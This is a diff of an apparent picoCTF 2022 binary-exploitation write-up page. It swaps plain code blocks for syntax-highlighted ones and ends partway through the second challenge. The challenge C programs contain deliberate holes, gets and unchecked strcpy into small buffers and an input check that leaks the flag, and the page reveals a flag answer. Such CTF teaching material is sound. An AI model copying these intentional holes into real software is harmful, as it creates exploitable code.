@@ -105,208 +105,208 @@ This challenge provided a C source code:" />
 <h3 id="description">Description</h3>
 <p>The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!</p>
 <p>This challenge provided a C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;stdbool.h&gt;
-#include &lt;string.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;ctype.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/time.h&gt;
-#include &lt;sys/types.h&gt;
-
-
-#define WAIT 60
-
-
-static const char* flag = &#34;[REDACTED]&#34;;
-
-static char data[10][100];
-static int input_lengths[10];
-static int inputs = 0;
-
-
-
-int tgetinput(char *input, unsigned int l)
-{
-    fd_set          input_set;
-    struct timeval  timeout;
-    int             ready_for_reading = 0;
-    int             read_bytes = 0;
-    
-    if( l &lt;= 0 )
-    {
-      printf(&#34;&#39;l&#39; for tgetinput must be greater than 0\n&#34;);
-      return -2;
-    }
-    
-    
-    /* Empty the FD Set */
-    FD_ZERO(&amp;input_set );
-    /* Listen to the input descriptor */
-    FD_SET(STDIN_FILENO, &amp;input_set);
-
-    /* Waiting for some seconds */
-    timeout.tv_sec = WAIT;    // WAIT seconds
-    timeout.tv_usec = 0;    // 0 milliseconds
-
-    /* Listening for input stream for any activity */
-    ready_for_reading = select(1, &amp;input_set, NULL, NULL, &amp;timeout);
-    /* Here, first parameter is number of FDs in the set, 
-     * second is our FD set for reading,
-     * third is the FD set in which any write activity needs to updated,
-     * which is not required in this case. 
-     * Fourth is timeout
-     */
-
-    if (ready_for_reading == -1) {
-        /* Some error has occured in input */
-        printf(&#34;Unable to read your input\n&#34;);
-        return -1;
-    } 
-
-    if (ready_for_reading) {
-        read_bytes = read(0, input, l-1);
-        if(input[read_bytes-1]==&#39;\n&#39;){
-        --read_bytes;
-        input[read_bytes]=&#39;\0&#39;;
-        }
-        if(read_bytes==0){
-            printf(&#34;No data given.\n&#34;);
-            return -4;
-        } else {
-            return 0;
-        }
-    } else {
-        printf(&#34;Timed out waiting for user input. Press Ctrl-C to disconnect\n&#34;);
-        return -3;
-    }
-
-    return 0;
-}
-
-
-static void data_write() {
-  char input[100];
-  char len[4];
-  long length;
-  int r;
-  
-  printf(&#34;Please enter your data:\n&#34;);
-  r = tgetinput(input, 100);
-  // Timeout on user input
-  if(r == -3)
-  {
-    printf(&#34;Goodbye!\n&#34;);
-    exit(0);
-  }
-  
-  while (true) {
-    printf(&#34;Please enter the length of your data:\n&#34;);
-    r = tgetinput(len, 4);
-    // Timeout on user input
-    if(r == -3)
-    {
-      printf(&#34;Goodbye!\n&#34;);
-      exit(0);
-    }
-  
-    if ((length = strtol(len, NULL, 10)) == 0) {
-      puts(&#34;Please put in a valid length&#34;);
-    } else {
-      break;
-    }
-  }
-
-  if (inputs &gt; 10) {
-    inputs = 0;
-  }
-
-  strcpy(data[inputs], input);
-  input_lengths[inputs] = length;
-
-  printf(&#34;Your entry number is: %d\n&#34;, inputs + 1);
-  inputs++;
-}
-
-
-static void data_read() {
-  char entry[4];
-  long entry_number;
-  char output[100];
-  int r;
-
-  memset(output, &#39;\0&#39;, 100);
-  
-  printf(&#34;Please enter the entry number of your data:\n&#34;);
-  r = tgetinput(entry, 4);
-  // Timeout on user input
-  if(r == -3)
-  {
-    printf(&#34;Goodbye!\n&#34;);
-    exit(0);
-  }
-  
-  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
-    puts(flag);
-    fseek(stdin, 0, SEEK_END);
-    exit(0);
-  }
-
-  entry_number--;
-  strncpy(output, data[entry_number], input_lengths[entry_number]);
-  puts(output);
-}
-
-
-int main(int argc, char** argv) {
-  char input[3] = {&#39;\0&#39;};
-  long command;
-  int r;
-
-  puts(&#34;Hi, welcome to my echo chamber!&#34;);
-  puts(&#34;Type &#39;1&#39; to enter a phrase into our database&#34;);
-  puts(&#34;Type &#39;2&#39; to echo a phrase in our database&#34;);
-  puts(&#34;Type &#39;3&#39; to exit the program&#34;);
-
-  while (true) {   
-    r = tgetinput(input, 3);
-    // Timeout on user input
-    if(r == -3)
-    {
-      printf(&#34;Goodbye!\n&#34;);
-      exit(0);
-    }
-    
-    if ((command = strtol(input, NULL, 10)) == 0) {
-      puts(&#34;Please put in a valid number&#34;);
-    } else if (command == 1) {
-      data_write();
-      puts(&#34;Write successful, would you like to do anything else?&#34;);
-    } else if (command == 2) {
-      if (inputs == 0) {
-        puts(&#34;No data yet&#34;);
-        continue;
-      }
-      data_read();
-      puts(&#34;Read successful, would you like to do anything else?&#34;);
-    } else if (command == 3) {
-      return 0;
-    } else {
-      puts(&#34;Please type either 1, 2 or 3&#34;);
-      puts(&#34;Maybe breaking boundaries elsewhere will be helpful&#34;);
-    }
-  }
-
-  return 0;
-}
-</code></pre><p>We can see that to read the data, we need to provide an entry number and the value we provided will be passing through this check:</p>
-<pre tabindex="0"><code>if ((entry_number = strtol(entry, NULL, 10)) == 0) {
-	puts(flag);
-	fseek(stdin, 0, SEEK_END);
-	exit(0);
-}
-</code></pre><p>With that being said, we just need to make the return value to be 0, and it can be easily achieve by inputting string instead of number.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/time.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define WAIT 60
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[REDACTED]&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">10</span>][<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> input_lengths[<span style="color:#ae81ff">10</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> inputs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">tgetinput</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> l)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    fd_set          input_set;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> timeval  timeout;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>             ready_for_reading <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span>             read_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( l <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;&#39;l&#39; for tgetinput must be greater than 0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Empty the FD Set */</span>
+</span></span><span style="display:flex;"><span>    FD_ZERO(<span style="color:#f92672">&amp;</span>input_set );
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Listen to the input descriptor */</span>
+</span></span><span style="display:flex;"><span>    FD_SET(STDIN_FILENO, <span style="color:#f92672">&amp;</span>input_set);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Waiting for some seconds */</span>
+</span></span><span style="display:flex;"><span>    timeout.tv_sec <span style="color:#f92672">=</span> WAIT;    <span style="color:#75715e">// WAIT seconds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    timeout.tv_usec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;    <span style="color:#75715e">// 0 milliseconds
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Listening for input stream for any activity */</span>
+</span></span><span style="display:flex;"><span>    ready_for_reading <span style="color:#f92672">=</span> select(<span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>input_set, NULL, NULL, <span style="color:#f92672">&amp;</span>timeout);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Here, first parameter is number of FDs in the set, 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * second is our FD set for reading,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * third is the FD set in which any write activity needs to updated,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * which is not required in this case. 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     * Fourth is timeout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ready_for_reading <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Some error has occured in input */</span>
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Unable to read your input</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ready_for_reading) {
+</span></span><span style="display:flex;"><span>        read_bytes <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, input, l<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(input[read_bytes<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;\n&#39;</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">--</span>read_bytes;
+</span></span><span style="display:flex;"><span>        input[read_bytes]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(read_bytes<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;No data given.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Timed out waiting for user input. Press Ctrl-C to disconnect</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">data_write</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> len[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> length;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> r;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Please enter your data:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  r <span style="color:#f92672">=</span> tgetinput(input, <span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Timeout on user input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (true) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Please enter the length of your data:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> tgetinput(len, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Timeout on user input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((length <span style="color:#f92672">=</span> strtol(len, NULL, <span style="color:#ae81ff">10</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Please put in a valid length&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (inputs <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>) {
+</span></span><span style="display:flex;"><span>    inputs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  strcpy(data[inputs], input);
+</span></span><span style="display:flex;"><span>  input_lengths[inputs] <span style="color:#f92672">=</span> length;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Your entry number is: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, inputs <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  inputs<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">data_read</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> entry[<span style="color:#ae81ff">4</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> entry_number;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> output[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> r;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  memset(output, <span style="color:#e6db74">&#39;\0&#39;</span>, <span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Please enter the entry number of your data:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  r <span style="color:#f92672">=</span> tgetinput(entry, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Timeout on user input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ((entry_number <span style="color:#f92672">=</span> strtol(entry, NULL, <span style="color:#ae81ff">10</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    puts(flag);
+</span></span><span style="display:flex;"><span>    fseek(stdin, <span style="color:#ae81ff">0</span>, SEEK_END);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  entry_number<span style="color:#f92672">--</span>;
+</span></span><span style="display:flex;"><span>  strncpy(output, data[entry_number], input_lengths[entry_number]);
+</span></span><span style="display:flex;"><span>  puts(output);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;\0&#39;</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> command;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> r;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Hi, welcome to my echo chamber!&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Type &#39;1&#39; to enter a phrase into our database&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Type &#39;2&#39; to echo a phrase in our database&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Type &#39;3&#39; to exit the program&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (true) {   
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> tgetinput(input, <span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Timeout on user input
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((command <span style="color:#f92672">=</span> strtol(input, NULL, <span style="color:#ae81ff">10</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Please put in a valid number&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (command <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      data_write();
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Write successful, would you like to do anything else?&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (command <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (inputs <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;No data yet&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      data_read();
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Read successful, would you like to do anything else?&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (command <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Please type either 1, 2 or 3&#34;</span>);
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#e6db74">&#34;Maybe breaking boundaries elsewhere will be helpful&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can see that to read the data, we need to provide an entry number and the value we provided will be passing through this check:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((entry_number <span style="color:#f92672">=</span> strtol(entry, NULL, <span style="color:#ae81ff">10</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>	puts(flag);
+</span></span><span style="display:flex;"><span>	fseek(stdin, <span style="color:#ae81ff">0</span>, SEEK_END);
+</span></span><span style="display:flex;"><span>	exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>With that being said, we just need to make the return value to be 0, and it can be easily achieve by inputting string instead of number.</p>
 <p><img src="/img/picoctf2022-binexp/bfe.png" alt="IMG"></p>
 <p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_149F090A}
@@ -322,51 +322,51 @@ int main(int argc, char** argv) {
 <h3 id="description-2">Description</h3>
 <p>Smash the stack Let&rsquo;s start off simple, can you overflow the correct buffer?</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;signal.h&gt;
-
-#define FLAGSIZE_MAX 64
-
-char flag[FLAGSIZE_MAX];
-
-void sigsegv_handler(int sig) {
-  printf(&#34;%s\n&#34;, flag);
-  fflush(stdout);
-  exit(1);
-}
-
-void vuln(char *input){
-  char buf2[16];
-  strcpy(buf2, input);
-}
-
-int main(int argc, char **argv){
-  
-  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
-  if (f == NULL) {
-    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
-                    &#34;own debugging flag.\n&#34;);
-    exit(0);
-  }
-  
-  fgets(flag,FLAGSIZE_MAX,f);
-  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
-  
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-
-
-  printf(&#34;Input: &#34;);
-  fflush(stdout);
-  char buf1[100];
-  gets(buf1); 
-  vuln(buf1);
-  printf(&#34;The program will exit now\n&#34;);
-  return 0;
-}
-</code></pre><p>It looks like it will print out the flag when it encounter SIGSEGV signal. So let&rsquo;s try it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE_MAX 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> flag[FLAGSIZE_MAX];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sigsegv_handler</span>(<span style="color:#66d9ef">int</span> sig) {
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, flag);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>input){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf2[<span style="color:#ae81ff">16</span>];
+</span></span><span style="display:flex;"><span>  strcpy(buf2, input);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
